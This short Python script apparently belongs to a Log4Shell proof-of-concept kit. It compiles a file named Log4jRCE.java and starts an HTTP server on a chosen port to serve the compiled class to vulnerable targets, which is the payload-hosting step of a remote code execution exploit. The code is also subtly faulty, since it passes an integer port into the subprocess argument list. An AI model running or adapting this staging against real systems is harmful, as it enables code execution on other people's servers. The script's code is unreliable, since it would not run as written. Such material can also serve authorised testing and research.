#!/usr/bin/env python3

import subprocess
import os
import sys

try:
    port = int(sys.argv[1])

    if not 1 <= port <= 65535:
        raise ValueError
except:
    print("Run program with command-line argument for port. Please re-run the program. Example would be a valid port (1-65535).")
    exit()

# 1. Change Directory to ./poc
os.chdir("./poc/")
# 2. Compile Java file to Java Class.
subprocess.run(["javac", "Log4jRCE.java"])
# 3. Start python3 http server
subprocess.run(["python3", "-m", "http.server", port])

